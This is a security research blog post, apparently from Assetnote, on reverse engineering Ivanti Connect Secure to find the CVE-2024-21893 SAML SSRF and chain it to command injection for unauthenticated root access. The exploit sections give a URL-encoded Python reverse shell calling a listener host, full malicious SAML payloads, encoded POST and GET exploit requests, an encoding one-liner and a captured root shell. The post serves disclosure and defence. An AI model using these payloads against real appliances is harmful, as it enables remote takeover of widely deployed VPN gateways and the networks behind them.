---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-02-02_auth-bypass-round-two.md
original_filename: 2024-02-02_auth-bypass-round-two.md
title: Auth Bypass Round Two
category: documents
detected_topics:
- saml
- command-injection
- sso
- ssrf
- api-security
- access-control
tags:
- imported
- documents
- saml
- command-injection
- sso
- ssrf
- api-security
- access-control
language: en
raw_sha256: 7b80800d2bd8a9d91849c1a83b4fa4ada4d9c330fbb62fa666a12935b5ffd5ec
text_sha256: 0ca81dcb96002264350200562b33a22a23d7cf40acc6dd1163b548520ae72fa9
ingested_at: '2026-06-28T07:32:30Z'
sensitivity: unknown
redactions_applied: false
---

# Auth Bypass Round Two

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-02-02_auth-bypass-round-two.md
- Source Type: markdown
- Detected Topics: saml, command-injection, sso, ssrf, api-security, access-control
- Ingested At: 2026-06-28T07:32:30Z
- Redactions Applied: False
- Raw SHA256: `7b80800d2bd8a9d91849c1a83b4fa4ada4d9c330fbb62fa666a12935b5ffd5ec`
- Text SHA256: `0ca81dcb96002264350200562b33a22a23d7cf40acc6dd1163b548520ae72fa9`


## Content

---
title: "Auth Bypass Round Two"
page_title: "Ivanti's Pulse Connect Secure Auth Bypass Round Two"
url: "https://www.assetnote.io/resources/research/ivantis-pulse-connect-secure-auth-bypass-round-two"
final_url: "https://www.assetnote.io/resources/research/ivantis-pulse-connect-secure-auth-bypass-round-two"
authors: ["Dylan Pindur"]
programs: ["Ivanti"]
bugs: ["SAML", "SSRF", "RCE", "Authentication bypass", "Security code review"]
publication_date: "2024-02-02"
added_date: "2024-02-06"
source: "pentester.land/writeups.json"
original_index: 464
---

[Research Notes](/resources/research)

Security Research

February 2, 2024

# Ivanti's Pulse Connect Secure Auth Bypass Round Two

No items found.

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/653795bb35bc995a6f921d3f_citrixbleed.svg)

Creative Commons license

## Introduction

The Ivanti excitement continues! After an authentication bypass and command injection to kick off the year, Ivanti are following with a second authentication bypass and a privilege escalation. On January 22 Ivanti released [this advisory](https://forums.ivanti.com/s/article/CVE-2024-21888-Privilege-Escalation-for-Ivanti-Connect-Secure-and-Ivanti-Policy-Secure?language=en_US) describing the two new vulnerabilities in Ivanti Connect Secure, CVE-2024-21888 (privilege escalation) and CVE-2024-21893 (authentication bypass).

As this was another critical authentication bypass and the unpatched command injection vulnerability was well known at this point, our security research team immediately began work to ensure that customers of our Attack Surface Management platform were notified if they were affected.

In this blog post, we detail our reverse engineering process to find and exploit this new authentication bypass. For details on how we obtained a copy of Ivanti Connect Secure and the source code please see our [previous post](https://www.assetnote.io/resources/research/high-signal-detection-and-exploitation-of-ivantis-pulse-connect-secure-auth-bypass-rce) which covers obtaining the VM Image and extracting the filesystem.

## Where to Start?  

The advisory from Ivanti mentioned a "server-side request forgery vulnerability in the SAML component of Ivanti Connect Secure". This gave us a really good starting point because there are only a few SAML endpoints available. Like most of the authentication functionality, SAML exists under the <span class="code_single-line">/dana-na/auth/</span> path and is handled by several Perl CGI scripts. We started with <span class="code_single-line">/dana-na/auth/saml-consumer.cgi</span> and found out pretty quickly that it hands off the request to <span class="code_single-line">DSAuth::SAMLConsumer::process</span> without really doing any checks or validation.  

  
  
  if ($status eq '') {
  $samlData =~ s/\r//g;
  $samlData =~ s/\n//g;
  $encoding = CGI::param('SAMLResponse');
  $status = DSAuth::SAMLConsumer::process($method, $samlData, 
  $assertRef, $targetURL, 
  $relayState, $encoding,
  $signature, $sigAlg,
  $sloSpId,$serverHostName);
  
  }
  
  

`‍`From our work on the previous vulnerabilities, we knew the `DSAuth` perl module was just a wrapper around some C and C++ libraries. We decompiled `DSAuth.so` with Ghidra and found that it imported most of its functions from the following libraries.

  * libdspdsdashlibs.so
  * libdsplibs.so
  * libdsppushconfiglibs.so
  * libdspsamllibs.so

We already had <span class="code_single-line">libdsplibs.so</span> decompiled and so quickly searched for <span class="code_single-line">SAMLConsumer</span> with Ghidra. We also could have used <span class="code_single-line">objdump</span> to print the symbol table, add the <span class="code_single-line">-C</span> to demangle the C++ names and grep for <span class="code_single-line">SAMLConsumer</span> to verify it was in there.  

  
  
  $ objdump -TC libdsplibs.so | grep SAMLConsumer
  00743000 g  DF .text  00000736  DSAuth::SAMLConsumer::process(DSStr const&, DSStr const&, DSStr const&, DSStr const&, DSStr const&, DSStr const&, DSStr const&, DSStr const&, DSStr const&, DSStr const&, DSStr&)
  
  

Unfortunately, all the <span class="code_single-line">DSAuth::SAMLConsumer::process</span> function did was put some variables in a table and then send them to a "saml sso par server".  

  
  
  cVar5 = DSParComm::connect(local_20,local_818,0x10,(char *)0x0,(int *)0x0);
  if (cVar5 == '\0') {
  if ((DAT_010913f8 == '\0') && (iVar7 = __cxa_guard_acquire(&DAT_010913f8), iVar7 != 0)) {
  /* try { // try from 00753463 to 00753467 has its CatchHandler @ 00753704 */
  DAT_01091400 = (uint *)DSGetStatementCounter("SAMLConsumer.cc",0x3e,"process","saml",10, "unable to connect to saml sso par server");
  __cxa_guard_release(&DAT_010913f8);
  }
  puVar3 = DAT_01091400;
  uVar2 = *DAT_01091400;
  puVar1 = DAT_01091400 + 1;
  *DAT_01091400 = uVar2 + 1;
  puVar3[1] = *puVar1 + (uint)(0xfffffffe < uVar2);
  iVar7 = DSLog::Debug::isOn();
  if (iVar7 != 0) {
  * try { // try from 00753405 to 00753409 has its CatchHandler @ 00753684 */
  DSLog::Debug::Write("saml",10,"SAMLConsumer.cc",0x3e, "unable to connect to saml sso par server");
  }
  /* try { // try from 007533a0 to 007533a4 has its CatchHandler @ 007536c2 */
  DSParComm::~DSParComm(local_20);
  }
  
  

`‍`We didn’t know what a “saml sso par server” was and at this stage decided it would be best to change strategies. We decided to configure our ICS VM to use SAML authentication, then we could capture some proper requests and see what the intended behaviour was.

In retrospect, we should have searched the filesystem for `saml`. Because the SAML server is sitting right there, but we only realised this later.
  
  
  $ find . | grep saml
  ./sdptemplates/saml_peer_sp.xml
  ./sdptemplates/saml_auth_server.xml
  ./bin/pssaml
  ./bin/dsunitysamlhandler
  ./bin/saml-server
  ./bin/saml-metadata-server
  ./config/samlmetadata.spec.cfg
  ...
  
  

## Finding the SAML Server

Using [Mock SAML](https://mocksaml.com/) and stumbling through multiple guides on how to configure ICS for SAML we were able to get it mostly working. We never got authentication to work, but we were able to get to a stage where ICS would send us to Mock SAML and Mock SAML would send us back with a <span class="code_single-line">SAMLResponse</span> that ICS would process and attempt to verify.

This gave us a SAML payload to modify and try different things with. While trying some XXE payloads we came across an error: <span class="code_single-line">Unknown issuer value in response</span>. We searched the filesystem for any matches to see where this error was coming from as it wasn't in anything we had seen so far.  

  
  
  $ grep -ir 'Unknown issuer value in response' .
  Binary file ./home/bin/saml-server matches
  
  

We found it in <span class="code_single-line">/home/bin/saml-server</span> which sounded like the server <span class="code_single-line">DSAuth::SAMLConsumer::process</span> connected to. We decompiled <span class="code_single-line">saml-server</span> and searched for the error message. There weren’t many helpful function names, however most had some kind of logging that included the function name. Below we can see the error message and the function name <span class="code_single-line">validateSAMLResponse</span>.  

  
  
  if (iVar15 != 0) {
  /* try { // try from 080e0b9d to 080e0ba1 has its CatchHandler @ 080e1877 */
  DSStr::operator=((DSStr *)param_5,"FAILURE: Unknown issuer value in response");
  if ((DAT_081fac98 == '\0') && (iVar8 = __cxa_guard_acquire(&DAT_081fac98), iVar8 != 0)) {
  /* try { // try from 080e0bf4 to 080e0bf8 has its CatchHandler @ 080e187e */
  DAT_081fad30 = (uint *)DSGetStatementCounter
  ("SAML2Consumer.cc",0x52d,"validateSAMLResponse","saml",0,
  "validateSAMLResponse: %s, Configured %s, Received %s");
  __cxa_guard_release(&DAT_081fac98);
  }
  puVar5 = DAT_081fad30;
  uVar2 = *DAT_081fad30;
  puVar1 = DAT_081fad30 + 1;
  *DAT_081fad30 = uVar2 + 1;
  puVar5[1] = *puVar1 + (uint)(0xfffffffe < uVar2);
  /* try { // try from 080e0c1e to 080e0c6e has its CatchHandler @ 080e1877 */
  DSLog::Debug::isOn();
  DSLog::Debug::Write("saml",0,"SAML2Consumer.cc",0x52d,
  "validateSAMLResponse: %s, Configured %s, Received %s",*param_5,
  *(undefined4 *)(param_1 + 0x16c),local_24);
  LAB_080e0c6f:
  xercesc_2_5::XMLString::release(&local_24);
  return 0;
  }
  
  

## Finding the SSRF

Now that we had the SAML server, we began working backwards from <span class="code_single-line">validateSAMLResponse</span> to see if we could get to the beginning of the SAML processing. From there we could look for anything that would indicate SSRF or XXE. While looking at the <span class="code_single-line">processPost</span> function we saw the following.  

  
  
  if ((param_4 != 0) &&
  (iVar6 = __dynamic_cast(param_4,&xmltooling::XMLObject::typeinfo, &opensaml::saml2p::Response::typeinfo,0xffffffff), iVar6 != 0)) {
  /* try { // try from 080e19eb to 080e19ef has its CatchHandler @ 080e1dd0 */
  xmltooling::ValidatorSuite::validate((XMLObject *)&xmltooling::SchemaValidators);
  cVar5 = FUN_080dfb70_validateSAMLResponse(param_1,iVar6,param_5,1,param_6);
  if (cVar5 != '\0') {
  return;
  }
  ...
  
  

We had previously seen an SSRF in SAML processing when validating the XML payload against an XML Schema Definition. Although unlikely, we thought it was worth verifying. <span class="code_single-line">`xmltooling::ValidatorSuite::validate</span>` was an imported from <span class="code_single-line">`libxmltooling.so.3</span>`. We searched online and found that it as an open source package so we wouldn’t need to decompile it.

The version we found on the device was <span class="code_single-line">libxmltooling.so.3.0.2</span>and searching for “libxmltooling.so.3.0.2 cve” led us to a [page of advisories](https://shibboleth.atlassian.net/wiki/spaces/SP3/pages/2067399654/SecurityAdvisories), quite a few without CVEs. The most recent affected <span class="code_single-line">xmltooling < 3.2.4</span> and was rated low. However, [the advisory](https://shibboleth.net/community/advisories/secadv_20230612.txt) sounded exactly like what we were looking for.

Including certain legal but “malicious in intent” content in the KeyInfo element defined by the XML Signature standard will result in attempts by the SP’s shibd process to dereference untrusted URLs.

We went to the [XML Signature spec](https://www.w3.org/TR/xmldsig-core1/) and began looking to see what we could put in a `KeyInfo` element. The [RetrievalMethod](https://www.w3.org/TR/xmldsig-core1/#sec-RetrievalMethod) option seemed like the obvious choice. We could specify a URI that the application would retrieve the certificate information from.

Since we already had a full SAML payload with the <span class="code_single-line">KeyInfo</span> element in it, all we needed to do was replace <span class="code_single-line">X509Data</span> with <span class="code_single-line">RetrievalMethod</span>. We used a Burp Collaborator URL to create the following KeyInfo element.
  
  
  <KeyInfo>
  <RetrievalMethod URI="http://0st7o9gpbz9bvbu14r2zxo85yw4psgg5.oastify.com/"></RetrievalMethod>
  </KeyInfo>
  
  

‍`‍`We put this back in our SAML response, sent the request and were pleased to see a hit in Collaborator.
  
  
  
  GET / HTTP/1.0
  Host: bbqi7kz0uasmemdcn2lagzrgh7nzbqzf.oastify.com
  
  

‍

We also got an error message from ICS saying it failed to process the SAML payload.
  
  
  <div id="table_saml-error_5" class="error-subtitle">
  SAML Transfer failed. Please contact your system administrator.
  </div>
  <div id="table_saml-error_5" class="intermediate__content">
  Detail: Failure: SAML Post Processing Failed. Caught an XMLSecurity exception while loading signature: An error occured during an XPath evalaution
  </div>
  
  

## Remote Code Execution

At this stage we were pretty confident we had the SSRF. Converting the SSRF to an authentication bypass and then RCE was comparatively much simpler.

We knew from the previous authentication bypass that the REST API was a python server behind a web proxy and all the authentication was done by the proxy. If we could use the SSRF to directly call the python server, we would be able to exploit the same command injection vulnerability as before.

The configuration file at <span class="code_single-line">/root/home/config/config_restserver.spec.cfg</span> showed the rest server was running on port 8090. So we modified our previous command injection payload which contained a python reverse shell. The previous payload exploited the path traversal as follows.
  
  
  https://192.168.1.211/api/v1/totp/user-backup-code/../../license/keys-status/%3b%70%79%74%68%6f%6e%20%2d%63%20%27%69%6d%70%6f%72%74%20%73%6f%63%6b%65%74%2c%73%75%62%70%72%6f%63%65%73%73%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%73%6f%63%6b%65%74%2e%41%46%5f%49%4e%45%54%2c%73%6f%63%6b%65%74%2e%53%4f%43%4b%5f%53%54%52%45%41%4d%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%22%31%39%32%2e%31%36%38%2e%31%2e%31%39%37%22%2c%34%34%34%34%29%29%3b%73%75%62%70%72%6f%63%65%73%73%2e%63%61%6c%6c%28%5b%22%2f%62%69%6e%2f%73%68%22%2c%22%2d%69%22%5d%2c%73%74%64%69%6e%3d%73%2e%66%69%6c%65%6e%6f%28%29%2c%73%74%64%6f%75%74%3d%73%2e%66%69%6c%65%6e%6f%28%29%2c%73%74%64%65%72%72%3d%73%2e%66%69%6c%65%6e%6f%28%29%29%27%3b
  
  

It was modified to remove the path traversal and target <span class="code_single-line">http://127.0.0.1:8090</span>.
  
  
  
  http://127.0.0.1:8090/api/v1/license/keys-status/%3b%70%79%74%68%6f%6e%20%2d%63%20%27%69%6d%70%6f%72%74%20%73%6f%63%6b%65%74%2c%73%75%62%70%72%6f%63%65%73%73%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%73%6f%63%6b%65%74%2e%41%46%5f%49%4e%45%54%2c%73%6f%63%6b%65%74%2e%53%4f%43%4b%5f%53%54%52%45%41%4d%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%22%31%39%32%2e%31%36%38%2e%31%2e%31%39%37%22%2c%34%34%34%34%29%29%3b%73%75%62%70%72%6f%63%65%73%73%2e%63%61%6c%6c%28%5b%22%2f%62%69%6e%2f%73%68%22%2c%22%2d%69%22%5d%2c%73%74%64%69%6e%3d%73%2e%66%69%6c%65%6e%6f%28%29%2c%73%74%64%6f%75%74%3d%73%2e%66%69%6c%65%6e%6f%28%29%2c%73%74%64%65%72%72%3d%73%2e%66%69%6c%65%6e%6f%28%29%29%27%3b
  
  

The full SAML payload was as follows. Since the vulnerability was just in the signature parsing, we could remove many of the other SAML elements.`  
`
  
  
  <?xml version="1.0" encoding="UTF-8"?>
  <samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" Version="2.0">
  <Signature xmlns="http://www.w3.org/2000/09/xmldsig#">
  <SignedInfo>
  <CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#" />
  <SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256" />
  </SignedInfo>
  <SignatureValue>x</SignatureValue>
  <KeyInfo>
  <RetrievalMethod URI="http://127.0.0.1:8090/api/v1/license/keys-status/%3b%70%79%74%68%6f%6e%20%2d%63%20%27%69%6d%70%6f%72%74%20%73%6f%63%6b%65%74%2c%73%75%62%70%72%6f%63%65%73%73%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%73%6f%63%6b%65%74%2e%41%46%5f%49%4e%45%54%2c%73%6f%63%6b%65%74%2e%53%4f%43%4b%5f%53%54%52%45%41%4d%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%22%31%39%32%2e%31%36%38%2e%31%2e%31%39%37%22%2c%34%34%34%34%29%29%3b%73%75%62%70%72%6f%63%65%73%73%2e%63%61%6c%6c%28%5b%22%2f%62%69%6e%2f%73%68%22%2c%22%2d%69%22%5d%2c%73%74%64%69%6e%3d%73%2e%66%69%6c%65%6e%6f%28%29%2c%73%74%64%6f%75%74%3d%73%2e%66%69%6c%65%6e%6f%28%29%2c%73%74%64%65%72%72%3d%73%2e%66%69%6c%65%6e%6f%28%29%29%27%3b">
  </RetrievalMethod>
  </KeyInfo>
  </Signature>
  </samlp:Response>
  
  

This was then encoded and sent to <span class="code_single-line">/dana-na/auth/saml-consumer.cgi</span>.
  
  
  POST /dana-na/auth/saml-consumer.cgi HTTP/1.1
  Host: 192.168.1.211
  Content-Length: 6658
  Content-Type: application/x-www-form-urlencoded
  Connection: close
  
  RelayState=x&SAMLResponse=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIFZlcnNpb249IjIuMCI%2bCiAgIDxTaWduYXR1cmUgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyMiPgogICAgICA8U2lnbmVkSW5mbz4KICAgICAgICAgPENhbm9uaWNhbGl6YXRpb25NZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzEwL3htbC1leGMtYzE0biMiIC8%2bCiAgICAgICAgIDxTaWduYXR1cmVNZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzA0L3htbGRzaWctbW9yZSNyc2Etc2hhMjU2IiAvPgogICAgICA8L1NpZ25lZEluZm8%2bCiAgICAgIDxTaWduYXR1cmVWYWx1ZT54PC9TaWduYXR1cmVWYWx1ZT4KICAgICAgPEtleUluZm8%2bCiAgICAgICAgIDxSZXRyaWV2YWxNZXRob2QgVVJJPSJodHRwOi8vMTI3LjAuMC4xOjgwOTAvYXBpL3YxL2xpY2Vuc2Uva2V5cy1zdGF0dXMvJTNiJTcwJTc5JTc0JTY4JTZmJTZlJTIwJTJkJTYzJTIwJTI3JTY5JTZkJTcwJTZmJTcyJTc0JTIwJTczJTZmJTYzJTZiJTY1JTc0JTJjJTczJTc1JTYyJTcwJTcyJTZmJTYzJTY1JTczJTczJTNiJTczJTNkJTczJTZmJTYzJTZiJTY1JTc0JTJlJTczJTZmJTYzJTZiJTY1JTc0JTI4JTczJTZmJTYzJTZiJTY1JTc0JTJlJTQxJTQ2JTVmJTQ5JTRlJTQ1JTU0JTJjJTczJTZmJTYzJTZiJTY1JTc0JTJlJTUzJTRmJTQzJTRiJTVmJTUzJTU0JTUyJTQ1JTQxJTRkJTI5JTNiJTczJTJlJTYzJTZmJTZlJTZlJTY1JTYzJTc0JTI4JTI4JTIyJTMxJTM5JTMyJTJlJTMxJTM2JTM4JTJlJTMxJTJlJTMxJTM5JTM3JTIyJTJjJTM0JTM0JTM0JTM0JTI5JTI5JTNiJTczJTc1JTYyJTcwJTcyJTZmJTYzJTY1JTczJTczJTJlJTYzJTYxJTZjJTZjJTI4JTViJTIyJTJmJTYyJTY5JTZlJTJmJTczJTY4JTIyJTJjJTIyJTJkJTY5JTIyJTVkJTJjJTczJTc0JTY0JTY5JTZlJTNkJTczJTJlJTY2JTY5JTZjJTY1JTZlJTZmJTI4JTI5JTJjJTczJTc0JTY0JTZmJTc1JTc0JTNkJTczJTJlJTY2JTY5JTZjJTY1JTZlJTZmJTI4JTI5JTJjJTczJTc0JTY0JTY1JTcyJTcyJTNkJTczJTJlJTY2JTY5JTZjJTY1JTZlJTZmJTI4JTI5JTI5JTI3JTNiIj4KICAgICAgICA8L1JldHJpZXZhbE1ldGhvZD4KICAgICAgPC9LZXlJbmZvPgogICA8L1NpZ25hdHVyZT4KPC9zYW1scDpSZXNwb25zZT4%3d
  
  

We then caught our reverse shell.
  
  
  $ nc -lv 192.168.1.197 4444
  sh: cannot set terminal process group (-1): Inappropriate ioctl for device
  sh: no job control in this shell
  sh-4.1# id
  id
  uid=0(root) gid=0(root) groups=0(root)
  
  

## A More Reliable Endpoint

While verifying the exploit we came across a common problem where if SAML was not configured the application would always respond with <span class="code_single-line">Missing/Invalid sign-in URL</span>. However, since we knew that the vulnerability existed in the signature verification and XML parsing it was possible that the exploit didn’t need to be part of the login flow. Any flow that processed SAML could be vulnerable.

We had a look at the other SAML endpoints and found <span class="code_single-line">/dana-na/auth/saml-logout.cgi</span>. Looking at the code it also called <span class="code_single-line">DSAuth::SAMLConsumer::process</span> which was promising.
  
  
  
  $status = DSAuth::SAMLConsumer::process($method, $samlData, 
  "", "", $relayState, $encoding, $signature, $sigAlg, $sloSpId, "");
  
  

‍`  
`We had to change some of the parameters and compress the SAML payload with deflate before base64 encoding, but otherwise the exploit worked with no modification. This version was much more reliable and worked on targets that did not appear to be configured for SAML authentication. A simple one-liner to correctly compress and encode the payload is as follows.
  
  
  cat payload.xml | python3 -c "import base64, zlib, sys; x=zlib.compressobj(wbits=-15); x.compress(sys.stdin.buffer.read()); print(base64.b64encode(x.flush()).decode('utf-8'))"
  lVTbbqMwEH3vVyCieSQ2BpuLklTVSitVu33p7Z2Ak6AlOMLk0v36nSGQpG121RWWNT4+M2fGHjO5PawrZ6cbW5p66vpj7jq6zk1R1sup+/L83Yvd29nNxGbrapM+arsxtdUOOtU27cCpu23q1GS2tGmdrbVN2zx9unv4mYoxTzeNaU1uKtd5HTQQdmc3juNMnsplnbXbpo83dVdtu0kZ2+/3430wNs2SCc454wlDQmHL5ejoOTjr4r5emAEi9FtWm7rMs6r8nbUo96DblSmcu2ppmrJdrf+i4TOfk4anD7mX+2E9ch12GfeU6pcD8nBI2lubRo8am3l2lQmpLkJP2OcyzlqvWbXVs8ORdIEMxB/67WP9j7ptSr3Lqj7Pl8f7U4a+iMYcPz+NecJZtinZzmdVmWu8UvZLv1nPtihjGQRziDhECUQhqBjUApQGwUEUoILOiEAloAqi4W4kiIl4FHRknOegZAfmBEYSlOhiioEgOzzotHAurvnqa2B8nRn6ECqQCwgTCHEpQQ7qn8kygBCZOM/JBZdIloK8KE4BIukTQ7IK+hOgIWl5TIOGgMCHAMmCmGQrCOLe7hHcjYiJyQTheaDESeUf59Mn4IPKaaConHfRFuRCt6DJpjLjXoXmgrbQkMVwBXiVYc8/njZFVh2Sd3VpkqaikvcuC0oP7f/zkl1XiC94JdROwdw9N/KEfWjk84O5bPqLl4H/KPb+JzX7Aw==
  
  

This can then be sent with a GET request. The <span class="code_single-line">`SpId</span>` parameter is added to bypass a small check, the value is unused.
  
  
  GET /dana-na/auth/saml-logout.cgi?SpId=1&SAMLResponse=lVTfb5s8FH3vX4Go7mNiY8AkKElVTZpUbX1pv%2fbdASdBIzjCtGn31%2ffYCSlrum%2bbYlnmcM4990fM7OplWwfPurWVaeZhNOZhoJvClFWznocP%2f30dTcKrxcXMqm29y%2b%2b03ZnG6gCixuYenIdPbZMbZSubN2qrbd4V%2bf317fdcjHm%2ba01nClOHwWPvAThcXARBMLuv1o3qntpjvHm46bpdzth%2bvx%2fv47Fp10xwzhmfMhBKW60vD8perMubZmV6yKFfVGOaqlB19VN1sLvV3caUwXW9Nm3Vbba%2f8YhYxJ3HSL8UoyJKmsswYMO4p1T%2fOiBP%2bqRHW9Pqy9aqkd0okcpB6Bk7L%2bPd61HVT3rxciANkJ74Tb9%2brP9Od22ln1V9zPPh7uaUYSSyMccvyid8ypnaVew5YnVVaIyU%2fdCvdmQ72FhG8ZIyTtmUsoTkhOSKpCbBSZQkY3%2fISE5Jlo6Gt5lwTOBZ7MnYlyRTDxYOzFKS4IAgegLeAo%2b9F3aEOtfqz8DJ58wkokRSuqJkSgkeU0p793NyGlMCJvalk%2bAR5FQ4lYtTkpgeEwPZaX0H3EIhSNun4ZagOKIYZOGY7iwpBu7PRwRvM8dEMnHyvmBxcvmf%2fhwTiEgWbsE0XfpooIGMKWA0GAE4Ph%2b4uB2TQnxBKWo5jACjxPL8Q7ddZOkRREYCeFz5oiAcShDc9%2b3fVJCgIvTnjyqsDH043W13Lz78kd8vzPBPP7gZ%2bEaxXz9Sizc%3d HTTP/1.1
  Host: 192.168.1.211
  Connection: close
  
  

## Conclusion

Like the previous Ivanti vulnerabilities this too has the potential for a big impact. The vulnerability is present on a large number of devices and doesn’t appear to require any specific configuration.

The mitigations from the previous vulnerability don’t appear address the root cause of the command injection vulnerability. As such more mitigations must be applied to mitigate this new bypass.

Fortunately Ivanti has released a patch which should address all the vulnerabilities. Those running Ivanti are recommended to factory reset their devices and apply the patch. The full details are available [here](https://forums.ivanti.com/s/article/KB-CVE-2023-46805-Authentication-Bypass-CVE-2024-21887-Command-Injection-for-Ivanti-Connect-Secure-and-Ivanti-Policy-Secure-Gateways?language=en_US)

As always, customers of our Attack Surface Management platform were the first to know when this vulnerability affected them. We continue to perform original security research in an effort to inform our customers about zero-day vulnerabilities in their attack surface.

Written by:

Dylan Pindur

Your subscription could not be saved. Please try again. 

Your subscription has been successful. 

Get updates on our research

Subscribe to our newsletter and stay updated on the newest research, security advisories, and more!

Enter your email address to subscribe

Provide your email address to subscribe. For e.g abc@xyz.com 

SUBSCRIBE 

### More Like This

[Security ResearchNew!Doing the Due Diligence: Analyzing the Next.js Middleware Bypass (CVE-2025-29927)Read moreRead on ASN Blog](/resources/research/doing-the-due-diligence-analyzing-the-next-js-middleware-bypass-cve-2025-29927)

[Security ResearchNew!How an obscure PHP footgun led to RCE in Craft CMSRead moreRead on ASN Blog](/resources/research/how-an-obscure-php-footgun-led-to-rce-in-craft-cms)

[Security ResearchNew!Citrix Denial of Service: Analysis of CVE-2024-8534Read moreRead on ASN Blog](/resources/research/citrix-denial-of-service-analysis-of-cve-2024-8534)

[Security ResearchNew!Nginx/Apache Path Confusion to Auth Bypass in PAN-OS (CVE-2025-0108)Read moreRead on ASN Blog](/resources/research/nginx-apache-path-confusion-to-auth-bypass-in-pan-os)

[Security ResearchNew!Leveraging An Order of Operations Bug to Achieve RCE in Sitecore 8.x - 10.xRead moreRead on ASN Blog](/resources/research/leveraging-an-order-of-operations-bug-to-achieve-rce-in-sitecore-8-x---10-x)

[Security ResearchNew!Insecurity through Censorship: Vulnerabilities Caused by The Great FirewallRead moreRead on ASN Blog](/resources/research/insecurity-through-censorship-vulnerabilities-caused-by-the-great-firewall)

[Back to All](/resources/research)

### Ready to get started?

Get on a call with our team and learn how Assetnote can change the way you secure your attack surface. We'll set you up with a trial instance so you can see the impact for yourself.

[Request a Demo](/demo)

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/64241df2676aeba82706ffe8_assetnote-logo.svg)

Address:  
Level 10, 12 Creek Street, Brisbane QLD, 4000  
‍  
Contact:  
[contact@assetnote.io  
  
](mailto:contact@assetnote.io)Press Inquiries:[  
](mailto:contact@assetnote.io)[press@assetnote.io](mailto:press@assetnote.io)

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/661f041240ed96ed7a03fe6f_61dc1beb212a1202fc512a76_SOC%202-03-p-500.png)

[](https://twitter.com/assetnote)[](https://www.linkedin.com/company/assetnote/)

Platform Features

[Continuous Asset Discovery](/platform/asset-discovery)

[Deep Asset Enrichment](/platform/asset-enrichment)

[Assetnote Exposure Engine](/platform/assetnote-exposure-engine)

[Expert Security Research](/platform/expert-security-research)

[Collaborative Workflows](/platform/collaborative-workflows)

[Customization](/platform/customization)

Use Cases

[Continuous Asset Discovery and Inventory](/use-cases/continuous-asset-discovery-and-inventory)

[Real-Time Exposure Monitoring](/use-cases/continuous-security-monitoring)

[Attack Surface Reduction](/use-cases/attack-surface-reduction)

[Mergers & Acquisitions](/use-cases/mergers-and-acquisitions)

[Bug Bounty Readiness](/use-cases/bug-bounty-readiness)

© 2026 Assetnote. All rights reserved.

[Privacy Policy](https://assetnote.io/policies/privacy-policy)
